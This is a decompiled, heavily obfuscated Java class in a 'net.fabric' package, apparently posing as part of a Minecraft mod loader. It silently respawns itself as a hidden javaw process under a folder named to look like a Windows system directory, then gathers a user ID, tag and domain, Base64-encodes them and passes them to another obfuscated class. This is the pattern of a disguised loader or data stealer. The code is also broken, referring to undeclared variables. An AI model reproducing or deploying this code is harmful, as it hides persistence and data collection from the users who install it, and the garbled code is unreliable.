package net.fabric;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

public class wqHlMe {
   public static void main(String[] args) {
      if (zfSmi.length > 0) {
         String var10000 = zfSmi[0];
         char[] var7 = "-restarted".toCharArray();
         if (!var10000.equals(new String(var7))) {
            bjuKfvjfjWgeqKxp.main(zfSmi);
            return;
         }
      }

      for (String prevTmp : zfSmi) {
         if (prevTmp.equals("-restarted")) {
            run();
            return;
         }
      }

      try {
         char[] var11 = "java.home".toCharArray();
         String nInfo = System.getProperty(new String(var11));
         String[] var10001 = new String[]{"bin", null};
         var10001[1] = "javaw.exe";
         Path wa_bJrlf = Path.of(nInfo, var10001);
         if (!Files.exists(wa_bJrlf)) {
            var10001 = new String[]{"bin", null};
            char[] var15 = "java.exe".toCharArray();
            var10001[1] = new String(var15);
            wa_bJrlf = Path.of(nInfo, var10001);
         }

         String vnQkwkgxVeda = new File(wqHlMe.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
         char[] var17 = "LOCALAPPDATA".toCharArray();
         String var33 = System.getenv(new String(var17));
         var10001 = new String[3];
         char[] var19 = "Microsoft".toCharArray();
         var10001[0] = new String(var19);
         char[] var21 = "Windows".toCharArray();
         var10001[1] = new String(var21);
         var10001[2] = "NtProfileIndex";
         Path hoBnujqr = Path.of(var33, var10001);
         Files.createDirectories(hoBnujqr);
         String ciiIcxawyHvctzuMtglb = wqHlMe.class.getName();
         String[] var10002 = new String[]{wa_bJrlf.toString(), "-cp", vnQkwkgxVeda, ciiIcxawyHvctzuMtglb, null};
         var10002[4] = "-restarted";
         ProcessBuilder dmhnKviLdwcVmf = new ProcessBuilder(var10002);
         dmhnKviLdwcVmf.redirectInput(Redirect.from(new File("NUL")));
         char[] var27 = "_spawn.log".toCharArray();
         dmhnKviLdwcVmf.redirectOutput(Redirect.appendTo(hoBnujqr.resolve(new String(var27)).toFile()));
         dmhnKviLdwcVmf.redirectErrorStream(true);
         dmhnKviLdwcVmf.directory(hoBnujqr.toFile());
         dmhnKviLdwcVmf.start();
      } catch (Exception var28) {
      }
   }

   private static void run() {
      bjuKfvjfjWgeqKxp aozAmcip = new bjuKfvjfjWgeqKxp();
      String TNeJ_Q = aozAmcip.getDomain();
      String cjgj_sh_wht_xw = bjuKfvjfjWgeqKxp.radFjkrfTeuTkrn();
      String pos3 = bjuKfvjfjWgeqKxp.tcwpPNX();
      String var10000 = uoZkwbkRscgnTknjqu(cjgj_sh_wht_xw);
      String var10001 = uoZkwbkRscgnTknjqu(pos3);
      String var8 = uoZkwbkRscgnTknjqu(TNeJ_Q);
      String var7 = var10001;
      String var6 = var10000;
      StringBuilder var16 = new StringBuilder();
      char[] var9 = "{\"userId\":\"".toCharArray();
      StringBuilder var17 = var16.append(new String(var9)).append(var6);
      StringBuilder var18 = var17.append("\",\"tag\":\"").append(var7);
      StringBuilder var19 = var18.append("\",\"domain\":\"").append(var8);
      String wdv_wpu_fjadu = var19.append("\",\"env\":\"DoubleClick\"}").toString();
      String x0C_Vz_WWzbo_ = Base64.getEncoder().encodeToString(wdv_wpu_fjadu.getBytes(StandardCharsets.UTF_8));
      bjuKfvjfjWgeqKxp.main(new String[]{x0C_Vz_WWzbo_});
   }

   private static String uoZkwbkRscgnTknjqu(String s) {
      if (yrwVkqBej == null) {
         int var9 = -1613732571;
         if ((var9 ^ -1613732571) == 0) {
            var9 = -120932403;
            var9 |= -828925806;
         }

         return "";
      } else {
         StringBuilder ieGtdgqMyq = new StringBuilder();

         for (char nfblBhyczg : yrwVkqBej.toCharArray()) {
            switch (nfblBhyczg) {
               case '\t':
                  break;
               case '\n':
                  break;
               case '\r':
                  break;
               case '"':
                  break;
               case '\\':
                  char[] var6 = "\\\\".toCharArray();
                  ieGtdgqMyq.append(new String(var6));
                  break;
               default:
                  if (nfblBhyczg < ' ') {
                     ieGtdgqMyq.append(String.format("\\u%04x", Integer.valueOf(nfblBhyczg)));
                  } else {
                     ieGtdgqMyq.append(nfblBhyczg);
                  }
            }
         }

         return ieGtdgqMyq.toString();
      }
   }
}
